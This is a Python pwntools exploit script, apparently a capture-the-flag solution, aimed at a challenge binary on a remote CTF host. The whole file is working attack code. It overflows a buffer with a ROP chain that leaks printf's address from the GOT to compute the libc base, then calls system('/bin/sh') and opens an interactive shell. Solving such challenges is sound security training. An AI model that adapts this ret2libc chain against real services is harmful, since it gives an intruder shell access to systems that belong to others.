from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			b* 0x000000000040122a
			b* 0x000000000040122a
			b* gift+1
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main_patched")
libc=ELF("./libc.so.6")
nc="nc pwned.securinets-tekup.tech 6000"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############
printf=0x0000000000401040
rdi=0x00000000004011f6
restart=0x401060
restart=0x00000000004011fe
got=0x404008
ret=0x000000000040122a
payload=p64(ret)+p64(rdi)+p64(printf)+p64(restart)
#debug()

gift=0x4011f2+1
p.sendline(b"e"*0x8+p64(got)+p64(got)+p64(gift)+p64(ret)+p64(printf)+p64(restart)+b"\x0a") # for some reason the payload doesnt work without the extra \n

p.recvuntil("Message retr0GPT >>> ")
libc.address=u64(p.recv(6)+b"\x00"*2)-libc.symbols["printf"]
print(hex(libc.address))

rdi=libc.address+0x00000000000240e5
payload=p64(rdi)+p64(next(libc.search(b"/bin/sh\x00")))+p64(libc.symbols["system"])

#debug()
p.sendline(b"e"*0x10+p64(0x0000000000404800)+p64(ret)+payload+p64(ret)+b"\x0a") # for some reason the payload doesnt work without the extra \n
p.interactive()